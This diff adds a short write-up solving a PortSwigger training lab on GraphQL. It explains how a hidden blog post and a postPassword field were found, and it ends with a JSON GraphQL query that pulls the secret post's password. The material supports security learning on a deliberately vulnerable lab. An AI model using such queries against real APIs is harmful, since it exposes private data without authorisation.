@@ -1,0 +1,16 @@
+The JSON payload at the bottom of this file is meant to solve the following lab:
+https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts
+
+Looking at the blog posts you'll notice that blog post 3 is missing.
+Using the InQL extension in BurpSuite we'll also see that there is a field named postPassword.
+
+In order to retrieve the password for the secret blog post we can use the following payload,
+which was modified from an intercepted POST request to a random blog (id was changed to 3 and postPassword field added):
+
+{
+    "query": "\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n     postPassword\n       author\n            date\n            paragraphs\n        }\n    }",
+    "operationName": "getBlogPost",
+    "variables": {
+      "id": 3
+    }
+}
